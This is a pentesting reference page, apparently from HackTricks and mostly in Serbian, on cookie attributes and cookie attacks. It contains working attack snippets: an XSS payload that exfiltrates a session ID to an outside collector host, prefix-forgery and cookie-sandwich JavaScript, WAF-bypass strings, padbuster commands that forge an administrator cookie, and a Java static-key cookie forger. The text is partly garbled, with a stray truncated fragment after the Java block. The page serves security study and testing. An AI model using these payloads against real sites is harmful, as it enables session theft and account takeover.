# Cookies Hacking

{{#include ../../banners/hacktricks-training.md}}

## Cookie Attributes

Cookies dolaze sa nekoliko atributa koji kontrolišu njihovo ponašanje u korisnikovom browseru. Ovde je pregled tih atributa u nešto pasivnijem tonu:

### Expires and Max-Age

Datum isteka cookie-ja određuje se `Expires` atributom. Suprotno tome, `Max-age` atribut definiše vreme u sekundama do brisanja cookie-ja. **Preferirajte `Max-age` jer odražava savremenije prakse.**

### Domain

Hostove koji treba da prime cookie određuje `Domain` atribut. Po defaultu, ovo je postavljeno na host koji je izdao cookie, bez uključivanja njegovih subdomena. Međutim, kada se `Domain` atribut eksplicitno postavi, on obuhvata i subdomene. To čini specificiranje `Domain` atributa manje restriktivnom opcijom, korisnom kada je potrebno deljenje cookie-ja između subdomena. Na primer, postavljanje `Domain=mozilla.org` omogućava pristup cookie-ju na subdomenima kao što je `developer.mozilla.org`.

### Path

`Path` atribut označava specifičnu URL putanju koja mora biti prisutna u zahtevanom URL-u da bi se poslao `Cookie` header. Ovaj atribut tretira `/` karakter kao separator direktorijuma, što omogućava podudaranja i u potdirektorijumima.

### Ordering Rules

Kada dva cookie-ja imaju isto ime, onaj koji će biti poslat bira se na osnovu:

- Cookie koji odgovara najdužoj putanji u traženom URL-u.
- Cookie koji je najnovije postavljen ako su putanje identične.

### SameSite

- `SameSite` atribut određuje da li se cookies šalju na zahteve koji potiču sa third-party domena. Nudi tri podešavanja:
- **Strict**: Sprečava slanje cookie-ja na third-party zahteve.
- **Lax**: Dozvoljava slanje cookie-ja uz GET zahteve inicirane sa third-party sajtova.
- **None**: Dozvoljava slanje cookie-ja sa bilo kog third-party domena.

Zapamtite, razumevanje ovih atributa prilikom konfiguracije cookie-ja pomaže da se obezbedi očekivano ponašanje u različitim scenarijima.

| **Tip zahteva** | **Primer koda**                   | **Cookies se šalju kada** |
| ---------------- | ---------------------------------- | ------------------------- |
| Link             | \<a href="...">\</a>               | NotSet\*, Lax, None       |
| Prerender        | \<link rel="prerender" href=".."/> | NotSet\*, Lax, None       |
| Form GET         | \<form method="GET" action="...">  | NotSet\*, Lax, None       |
| Form POST        | \<form method="POST" action="..."> | NotSet\*, None            |
| iframe           | \<iframe src="...">\</iframe>      | NotSet\*, None            |
| AJAX             | $.get("...")                       | NotSet\*, None            |
| Image            | \<img src="...">                   | NetSet\*, None            |

Table from [Invicti](https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/) and slightly modified.\
Cookie sa _**SameSite**_ atributom će **ublažiti CSRF napade** gde je potrebna ulogovana sesija.

**\*Obratite pažnju da od Chrome80 (feb/2019) podrazumevano ponašanje cookie-ja bez SameSite** **atributa bude Lax** ([https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/](https://www.troyhunt.com/promiscuous-cookies-and-their-impending-death-via-the-samesite-policy/)).\
Napomena: privremeno, nakon primene ove promene, **cookie-ji bez SameSite** **politike** u Chrome-u biće **tretirani kao None** tokom **prva 2 minuta**, a zatim kao Lax za top-level cross-site POST zahteve.

## Cookies Flags

### HttpOnly

Ovo sprečava klijenta da pristupi cookie-ju (npr. preko **Javascript**: `document.cookie`)

#### **Bypasses**

- Ako stranica **u odgovoru vraća cookies** (na primer u **PHPinfo** stranici), moguće je iskoristiti XSS da se pošalje zahtev toj stranici i **ukradu cookie-ji** iz odgovora (pogledajte primer na [https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/](https://blog.hackcommander.com/posts/2022/11/12/bypass-httponly-via-php-info-page/)).
- Ovo se može zaobići pomoću **TRACE** **HTTP** zahteva jer će odgovor servera (ako je ova HTTP metoda dostupna) reflektovati poslate cookies. Ova tehnika se naziva **Cross-Site Tracking**.
- Moderna pregledaća to izbegavaju tako što ne dozvoljavaju slanje TRACE zahteva iz JS. Međutim, pronađeni su neki bypass-ovi u specifičnom softveru, npr. slanje `\r\nTRACE` umesto `TRACE` ka IE6.0 SP2.
- Još jedan način je eksploatacija zero/day ranjivosti u browser-ima.
- Moguće je **prepisati HttpOnly cookie-je** izvođenjem Cookie Jar overflow napada:


{{#ref}}
cookie-jar-overflow.md
{{#endref}}

- Moguće je koristiti [**Cookie Smuggling**](#cookie-smuggling) napad da se izvrši eksfiltracija ovih cookie-ja
- Ako bilo koji server-side endpoint echo-uje raw session ID u HTTP odgovoru (npr. u HTML komentarima ili debug bloku), možete zaobići HttpOnly koristeći XSS gadget koji dohvatiti taj endpoint, izvuče tajni podatak pomoću regex-a i eksfiltrira ga. Primer XSS payload paterna:
```js
// Extract content between <!-- startscrmprint --> ... <!-- stopscrmprint -->
const re = /<!-- startscrmprint -->([\s\S]*?)<!-- stopscrmprint -->/;
fetch('/index.php?module=Touch&action=ws')
.then(r => r.text())
.then(t => { const m = re.exec(t); if (m) fetch('https://collab/leak', {method:'POST', body: JSON.stringify({leak: btoa(m[1])})}); });
```
### Secure

Zahtjev će **samo** poslati cookie u HTTP zahtevu ako je zahtev prenesen preko sigurnog kanala (obično **HTTPS**).

## Cookies Prefixes

Cookies prefixed with `__Secure-` moraju biti postavljeni uz `secure` flag sa stranica koje su zaštićene HTTPS-om.

For cookies prefixed with `__Host-`, several conditions must be met:

- Moraju biti postavljeni sa `secure` flag-om.
- Moraju poticati sa stranice zaštićene HTTPS-om.
- Zabranjeno je navoditi domain, čime se onemogućava njihovo slanje na subdomaine.
- Path za ove cookies mora biti postavljen na `/`.

Važno je napomenuti da cookies prefiksovani sa `__Host-` ne smeju biti poslati na superdomen ili subdomene. Ovo ograničenje pomaže u izolaciji aplikacionih cookies-a. Dakle, korišćenje `__Host-` prefiksa za sve aplikacione cookies može se smatrati dobrom praksom za poboljšanje sigurnosti i izolacije.

### Prepisivanje cookies

Dakle, jedna od zaštita `__Host-` prefiksovanih cookies je sprečavanje njihovog prepisivanja sa subdomena. Time se, na primer, sprečavaju [**Cookie Tossing attacks**](cookie-tossing.md). U predavanju [**Cookie Crumbles: Unveiling Web Session Integrity Vulnerabilities**](https://www.youtube.com/watch?v=F_wAzF4a7Xg) ([**paper**](https://www.usenix.org/system/files/usenixsecurity23-squarcina.pdf)) prikazano je da je bilo moguće setovati \_\_HOST- prefiksovane cookies sa subdomena prevarom parsera — na primer dodavanjem "=" na početku ili na početku i kraju...:

<figure><img src="../../images/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ili u PHP-u je bilo moguće dodati **druge karaktere na početku** imena cookie-ja koji su bili **zamenjeni underscore** karakterima, što je omogućavalo prepisivanje `__HOST-` cookies:

<figure><img src="../../images/image (7) (1) (1) (1) (1).png" alt="" width="373"><figcaption></figcaption></figure>


#### Unicode whitespace cookie-name smuggling (prefix forgery)

Iskoristite razlike u parsiranju između browser-a i servera tako što ćete na početak imena cookie-ja staviti Unicode whitespace code point. Browser neće smatrati da ime doslovno počinje sa `__Host-`/`__Secure-`, pa će dozvoliti postavljanje sa subdomena. Ako backend trimuje/normalizuje vodeće Unicode whitespace u ključevima cookie-ja, videće zaštićeno ime i može prepisati cookie visokih privilegija.

- PoC from a subdomain that can set parent-domain cookies:
```js
document.cookie = `${String.fromCodePoint(0x2000)}__Host-name=injected; Domain=.example.com; Path=/;`;
```
- Tipično ponašanje backend-a koje omogućava problem:
- Frameworks that trim/normalize cookie keys. In Django, Python’s `str.strip()` removes a wide range of Unicode whitespace code points, causing the name to normalize to `__Host-name`.
- Commonly trimmed code points include: U+0085 (NEL, 133), U+00A0 (NBSP, 160), U+1680 (5760), U+2000–U+200A (8192–8202), U+2028 (8232), U+2029 (8233), U+202F (8239), U+205F (8287), U+3000 (12288).
- Many frameworks resolve duplicate cookie names as “last wins”, so the attacker-controlled normalized cookie value overwrites the legitimate one.

- Browser differences matter:
- Safari blocks multibyte Unicode whitespace in cookie names (e.g., rejects U+2000) but still permits single-byte U+0085 and U+00A0, which many backends trim. Cross-test across browsers.

- Impact: Omogućava prepisivanje `__Host-`/`__Secure-` cookies iz manje-pouzdanih konteksta (subdomains), što može dovesti do XSS (ako se reflektuje), prepisivanja CSRF tokena i session fixation.

- On-the-wire vs server view example (U+2000 present in name):
```
Cookie: __Host-name=Real; â€€__Host-name=<img src=x onerror=alert(1)>;
```
Mnogi backendi razlažu/parsiraju i zatim uklanjaju razmake, što rezultira time da normalizovani `__Host-name` preuzme vrednost napadača.

#### Legacy `$Version=1` cookie splitting na Java backendima (prefix bypass)

Neki Java stackovi (npr. Tomcat/Jetty-style) i dalje omogućavaju zastarelo RFC 2109/2965 parsiranje kada zaglavlje `Cookie` počinje sa `$Version=1`. To može navesti server da reinterpretira jedan cookie string kao više logičkih cookie-ja i prihvati falsifikovan `__Host-` unos koji je prvobitno postavljen sa poddomena ili čak preko nesigurnog porekla.

- PoC koji prisiljava zastarelo parsiranje:
```js
document.cookie = `$Version=1,__Host-name=injected; Path=/somethingreallylong/; Domain=.example.com;`;
```
- Why it works:
- Client-side prefix checks apply during set, but server-side legacy parsing later splits and normalizes the header, bypassing the intent of `__Host-`/`__Secure-` prefix guarantees.

- Where to try: Tomcat, Jetty, Undertow, or frameworks that still honor RFC 2109/2965 attributes. Combine with duplicate-name overwrite semantics.

#### Duplicate-name last-wins overwrite primitive

When two cookies normalize to the same name, many backends (including Django) use the last occurrence. After smuggling/legacy-splitting produces two `__Host-*` names, the attacker-controlled one will typically win.

#### Detection and tooling

Use Burp Suite to probe for these conditions:

- Try multiple leading Unicode whitespace code points: U+2000, U+0085, U+00A0 and observe whether the backend trims and treats the name as prefixed.
- Send `$Version=1` first in the Cookie header and check if the backend performs legacy splitting/normalization.
- Observe duplicate-name resolution (first vs last wins) by injecting two cookies that normalize to the same name.
- Burp Custom Action to automate this: [CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

> Tip: These techniques exploit RFC 6265’s octet-vs-string gap: browsers send bytes; servers decode and may normalize/trim. Mismatches in decoding and normalization are the core of the bypass.

## Cookies Attacks

If a custom cookie contains sensitive data check it (specially if you are playing a CTF), as it might be vulnerable.

### Decoding and Manipulating Cookies

Sensitive data embedded in cookies should always be scrutinized. Cookies encoded in Base64 or similar formats can often be decoded. This vulnerability allows attackers to alter the cookie's content and impersonate other users by encoding their modified data back into the cookie.

### Session Hijacking

This attack involves stealing a user's cookie to gain unauthorized access to their account within an application. By using the stolen cookie, an attacker can impersonate the legitimate user.

### Session Fixation

In this scenario, an attacker tricks a victim into using a specific cookie to log in. If the application does not assign a new cookie upon login, the attacker, possessing the original cookie, can impersonate the victim. This technique relies on the victim logging in with a cookie supplied by the attacker.

If you found an **XSS in a subdomain** or you **control a subdomain**, read:


{{#ref}}
cookie-tossing.md
{{#endref}}

### Session Donation

Here, the attacker convinces the victim to use the attacker's session cookie. The victim, believing they are logged into their own account, will inadvertently perform actions in the context of the attacker's account.

If you found an **XSS in a subdomain** or you **control a subdomain**, read:


{{#ref}}
cookie-tossing.md
{{#endref}}

### [JWT Cookies](../hacking-jwt-json-web-tokens.md)

Click on the previous link to access a page explaining possible flaws in JWT.

JSON Web Tokens (JWT) used in cookies can also present vulnerabilities. For in-depth information on potential flaws and how to exploit them, accessing the linked document on hacking JWT is recommended.

### Cross-Site Request Forgery (CSRF)

This attack forces a logged-in user to execute unwanted actions on a web application in which they're currently authenticated. Attackers can exploit cookies that are automatically sent with every request to the vulnerable site.

### Empty Cookies

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) Browsers permit the creation of cookies without a name, which can be demonstrated through JavaScript as follows:
```js
document.cookie = "a=v1"
document.cookie = "=test value;" // Setting an empty named cookie
document.cookie = "b=v2"
```
Rezultat u poslatom cookie header-u je `a=v1; test value; b=v2;`. Zanimljivo, ovo omogućava manipulaciju cookie-jem ako je postavljen cookie bez imena, potencijalno omogućavajući kontrolu nad drugim cookie-jevima postavljanjem praznog cookie-ja na određenu vrednost:
```js
function setCookie(name, value) {
document.cookie = `${name}=${value}`
}

setCookie("", "a=b") // Setting the empty cookie modifies another cookie's value
```
Ovo dovodi do toga da pregledač pošalje cookie header koji svaki web server tumači kao cookie pod imenom `a` sa vrednošću `b`.

#### Chrome greška: problem sa Unicode surrogate codepoint-om

U Chrome-u, ako je Unicode surrogate codepoint deo set cookie-a, `document.cookie` biva korumpiran i posle toga vraća prazan string:
```js
document.cookie = "\ud800=meep"
```
Ovo rezultira time da `document.cookie` ispisuje prazan string, što ukazuje na trajno oštećenje.

#### Cookie Smuggling zbog problema pri parsiranju

(Pogledajte dalje detalje u[original research](https://blog.ankursundara.com/cookie-bugs/)) Nekoliko web servera, uključujući one iz Java (Jetty, TomCat, Undertow) i Python (Zope, cherrypy, web.py, aiohttp, bottle, webob), pogrešno obrađuju cookie stringove zbog zastarele podrške za RFC2965. Oni čitaju vrednost cookie-ja u dvostrukim navodnicima kao jednu vrednost čak i ako sadrži tačke-zarez, koje bi normalno trebale razdvajati parove ključ-vrednost:
```
RENDER_TEXT="hello world; JSESSIONID=13371337; ASDF=end";
```
#### Cookie Injection Vulnerabilities

(Check further details in the[original research](https://blog.ankursundara.com/cookie-bugs/)) Neispravno parsiranje cookies-a od strane servera, naročito Undertow, Zope i onih koji koriste Python-ove `http.cookie.SimpleCookie` i `http.cookie.BaseCookie`, stvara mogućnosti za cookie injection napade. Ti serveri ne uspevaju pravilno da odvoje početak novih cookies-a, što omogućava napadačima da falsifikuju cookies:

- Undertow očekuje novi cookie odmah nakon citirane vrednosti bez tačka-zareza.
- Zope traži zarez da započne parsiranje sledećeg cookie-a.
- Python-ove cookie klase počinju parsiranje na karakter razmaka.

Ova ranjivost je posebno opasna u web aplikacijama koje se oslanjaju na cookie-based CSRF zaštitu, jer omogućava napadačima da injektuju falsifikovane CSRF-token cookies, potencijalno zaobilazeći bezbednosne mere. Problem se dodatno pogoršava Python-ovim rukovanjem dupliranim imenima cookies-a, gde poslednja pojava nadjačava prethodne. Takođe podiže zabrinutost za `__Secure-` i `__Host-` cookies u nesigurnim kontekstima i može dovesti do zaobilaženja autorizacije kada se cookies prosleđuju back-end serverima podložnim spoofingu.

### Cookies $version

#### WAF Bypass

According to [**this blogpost**](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie), moguće je iskoristiti atribut kolačića **`$Version=1`** da backend počne da koristi stariju logiku za parsiranje kolačića zbog **RFC2109**. Pored toga, druge vrednosti kao što su **`$Domain`** i **`$Path`** mogu se koristiti za modifikaciju ponašanja backenda u vezi sa cookie-jem.

#### Cookie Sandwich Attack

According to [**this blogpost**](https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique) it's possible to use the cookie sandwich technique to steal HttpOnly cookies. These are the requirements and steps:

- Pronađite mesto gde se naizgled beskoristan **cookie reflektuje u response-u**
- **Kreirajte cookie nazvan `$Version`** sa vrednošću `1` (ovo možete uraditi u XSS napadu iz JS) sa specifičnijom putanjom tako da zauzme početnu poziciju (neki framework-i kao python ne zahtevaju ovaj korak)
- **Kreirajte cookie koji se reflektuje** sa vrednošću koja ostavlja **otvoreni dvostruki navodnik** i sa specifičnom putanjom tako da bude pozicioniran u cookie bazi nakon prethodnog (`$Version`)
- Tada će legitimni cookie ići sledeći u redu
- **Kreirajte lažni cookie koji zatvara dvostruke navodnike** unutar svoje vrednosti

Na ovaj način žrtvin cookie biva zarobljen unutar novog cookie-ja verzije 1 i biće reflektovan kad god se reflektuje.
e.g. from the post:
```javascript
document.cookie = `$Version=1;`;
document.cookie = `param1="start`;
// any cookies inside the sandwich will be placed into param1 value server-side
document.cookie = `param2=end";`;
```
### WAF bypasses

#### Cookies $version

Pogledaj prethodni odeljak.

#### Bypassing value analysis with quoted-string encoding

Ovo parsiranje znači da se escape-ovane vrednosti unutar cookies de-escape-uju, tako da "\a" postaje "a". Ovo može biti korisno za zaobilaženje WAFS kao:

- `eval('test') => forbidden`
- `"\e\v\a\l\(\'\t\e\s\t\'\)" => allowed`

#### Bypassing cookie-name blocklists

U RFC2109 je navedeno da se **comma can be used as a separator between cookie values**. Takođe je moguće dodati **spaces and tabs before an after the equal sign**. Dakle cookie kao `$Version=1; foo=bar, abc = qux` ne generiše cookie `"foo":"bar, admin = qux"` već cookies `foo":"bar"` i `"admin":"qux"`. Obratite pažnju kako su kreirana 2 cookies i kako je kod admin uklonjen razmak pre i posle znaka jednakosti.

#### Bypassing value analysis with cookie splitting

Na kraju, različiti backdoors bi spojili u jedan string različite cookies poslate u različitim cookie headers kao u:
```
GET / HTTP/1.1
Host: example.com
Cookie: param1=value1;
Cookie: param2=value2;
```
Što bi moglo omogućiti zaobilaženje WAF-a kao u ovom primeru:
```
Cookie: name=eval('test//
Cookie: comment')

Resulting cookie: name=eval('test//, comment') => allowed
```
### Dodatne provere ranjivih cookies

#### **Osnovne provere**

- **cookie** je **isti** svaki put kada se **login**.
- Log out i pokušajte da koristite isti cookie.
- Pokušajte da se log in sa 2 uređaja (ili browsers) na isti nalog koristeći isti cookie.
- Proverite da li cookie sadrži bilo kakve informacije i pokušajte da ih modifikujete.
- Pokušajte da napravite nekoliko accounts sa skoro istim username-om i proverite da li možete uočiti sličnosti.
- Proverite opciju "**remember me**" ako postoji da vidite kako radi. Ako postoji i može biti ranjiva, uvek koristite cookie od **remember me** bez ikakvog drugog cookie-a.
- Proverite da li prethodni cookie radi čak i nakon što promenite password.

#### **Napredni cookies napadi**

Ako cookie ostane isti (ili skoro isti) kada se log in, to verovatno znači da je cookie povezan sa nekim poljem vašeg naloga (verovatno username). Tada možete:

- Pokušajte da kreirate mnogo **accounts** sa veoma sličnim **usernames** i pokušajte da **pogodite** kako algoritam radi.
- Pokušajte da **bruteforce the username**. Ako cookie služi samo kao metod autentikacije za vaš username, onda možete napraviti nalog sa username-om "**Bmin**" i **bruteforce** svaki pojedinačni **bit** vašeg cookie-a, jer će jedan od cookie-a koje probate biti onaj koji pripada "**admin**".
- Isprobajte **Padding** **Oracle** (možete dekriptovati sadržaj cookie-a). Koristite **padbuster**.

**Padding Oracle - Padbuster primeri**
```bash
padbuster <URL/path/when/successfully/login/with/cookie> <COOKIE> <PAD[8-16]>
# When cookies and regular Base64
padbuster http://web.com/index.php u7bvLewln6PJPSAbMb5pFfnCHSEd6olf 8 -cookies auth=u7bvLewln6PJPSAbMb5pFfnCHSEd6olf

# If Base64 urlsafe or hex-lowercase or hex-uppercase --encoding parameter is needed, for example:
padBuster http://web.com/home.jsp?UID=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6
7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6 8 -encoding 2
```
Padbuster će izvršiti nekoliko pokušaja i tražiće od vas koji uslov predstavlja grešku (onaj koji nije važeći).

Zatim će početi decrypting the cookie (može potrajati nekoliko minuta)

Ako je attack uspešno izveden, onda možete pokušati da **encrypt** string po sopstvenom izboru. Na primer, ako biste želeli da **encrypt** **user=administrator**
```
padbuster http://web.com/index.php 1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== 8 -cookies thecookie=1dMjA5hfXh0jenxJQ0iW6QXKkzAGIWsiDAKV3UwJPT2lBP+zAD0D0w== -plaintext user=administrator
```
Ovim izvršavanjem dobićete cookie pravilno enkriptovan i kodiran sa stringom **user=administrator** unutra.

**CBC-MAC**

Moguće je da cookie sadrži neku vrednost i da je potpisan koristeći CBC. Tada je integritet vrednosti potpis kreiran koristeći CBC sa istom vrednošću. Pošto se preporučuje da se za IV koristi null vector, ova vrsta provere integriteta može biti ranjiva.

**Napad**

1. Nabavite potpis za username **administ** = **t**
2. Nabavite potpis za username **rator\x00\x00\x00 XOR t** = **t'**
3. Postavite u cookie vrednost **administrator+t'** (**t'** će biti validan potpis za **(rator\x00\x00\x00 XOR t) XOR t** = **rator\x00\x00\x00**

**ECB**

Ako je cookie enkriptovan koristeći ECB, može biti ranjiv.\  
Kada se logujete cookie koji dobijete mora uvek biti isti.

Kako otkriti i napasti:

Kreirajte 2 users sa skoro istim podacima (username, password, email, etc.) i pokušajte da otkrijete neki obrazac unutar dobijenog cookie-a

Kreirajte user-a nazvanog na primer "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" i proverite da li postoji neki obrazac u cookie-u (as ECB encrypts with the same key every block, the same encrypted bytes could appear if the username is encrypted).

Trebao bi postojati obrazac (sa veličinom korišćenog bloka). Dakle, znajući kako se grupa "a" enkriptuje možete kreirati username: "a"\*(size of the block)+"admin". Zatim, možete obrisati enkriptovani obrazac jednog bloka "a" iz cookie-a. I imaćete cookie korisničkog imena "admin".

### Static-key cookie forgery (symmetric encryption of predictable IDs)

Some applications mint authentication cookies by encrypting only a predictable value (e.g., the numeric user ID) under a global, hard-coded symmetric key, then encoding the ciphertext (hex/base64). If the key is static per product (or per install), anyone can forge cookies for arbitrary users offline and bypass authentication.

How to test/forge
- Identify the cookie(s) that gate auth, e.g., COOKIEID and ADMINCOOKIEID.
- Determine cipher/encoding. In one real-world case the app used IDEA with a constant 16-byte key and returned the ciphertext as hex.
- Verify by encrypting your own user ID and comparing with the issued cookie. If it matches, you can mint cookies for any target ID (1 often maps to the first admin).
- Set the forged value directly as the cookie and browse; no credentials are needed.

<details>
<summary>Minimalni Java PoC (IDEA + hex) korišćen u praksi</summary>
```java
import cryptix.provider.cipher.IDEA;
import cryptix.provider.key.IDEAKeyGenerator;
import cryptix.util.core.Hex;
import java.security.Key;
import java.security.KeyException;
import java.io.UnsupportedEncodingException;

public class App {
private String ideaKey = "1234567890123456"; // example static key

public String encode(char[] plainArray) { return encode(new String(plainArray)); }

public String encode(String plain) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA encrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
encrypt.initEncrypt(key);
} catch (KeyException e) { return null; }
if (plain.length() == 0 || plain.length() % encrypt.getInputBlockSize() > 0) {
for (int currentPad = plain.length() % encrypt.getInputBlockSize(); currentPad < encrypt.getInputBlockSize(); currentPad++) {
plain = plain + " "; // space padding
}
}
byte[] encrypted = encrypt.update(plain.getBytes());
return Hex.toString(encrypted); // cookie expects hex
}

public String decode(String chiffre) {
IDEAKeyGenerator keygen = new IDEAKeyGenerator();
IDEA decrypt = new IDEA();
Key key;
try {
key = keygen.generateKey(this.ideaKey.getBytes());
decrypt.initDecrypt(key);
} catch (KeyException e) { return null; }
byte[] decrypted = decrypt.update(Hex.fromString(chiffre));
try { return new String(decrypted, "ISO_8859-1").trim(); } catch (UnsupportedEncodingException e) { return null; }
}

public void setKey(String key) { this.ideaKey = key; }
}
```
</details>kontekst (npr. server-side session sa random ID, ili dodajte anti-replay properties).

## Reference

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)
- [https://blog.ankursundara.com/cookie-bugs/](https://blog.ankursundara.com/cookie-bugs/)
- [https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd](https://www.linkedin.com/posts/rickey-martin-24533653_100daysofhacking-penetrationtester-ethicalhacking-activity-7016286424526180352-bwDd)
- [https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie](https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie)
- [https://seclists.org/webappsec/2006/q2/181](https://seclists.org/webappsec/2006/q2/181)
- [https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it](https://www.michalspacek.com/stealing-session-ids-with-phpinfo-and-how-to-stop-it)
- [https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [Cookie Chaos: How to bypass __Host and __Secure cookie prefixes](https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes)
- [Burp Custom Action – CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)

{{#include ../../banners/hacktricks-training.md}}
